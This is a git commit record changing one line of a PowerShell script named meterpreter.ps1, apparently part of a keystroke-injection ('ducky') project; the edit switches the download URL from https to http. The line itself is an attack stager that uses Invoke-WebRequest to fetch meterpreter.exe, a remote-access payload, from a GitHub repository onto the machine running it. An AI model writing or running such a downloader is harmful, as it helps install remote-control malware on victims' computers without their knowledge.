82a33f796b5a9fc3005a22fffcb38a868e69fe00
Ashish D'Souza <ashish.dsouza@students.polytech.k12.de.us>
2018-08-01 20:30:57 -0400

    Update meterpreter.ps1

--- meterpreter.ps1
+++ meterpreter.ps1
@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://github.com/computer-geek64/ducky/raw/master/meterpreter.exe" -OutFile meterpreter.exe
+Invoke-WebRequest -Uri "http://github.com/computer-geek64/ducky/raw/master/meterpreter.exe" -OutFile meterpreter.exe
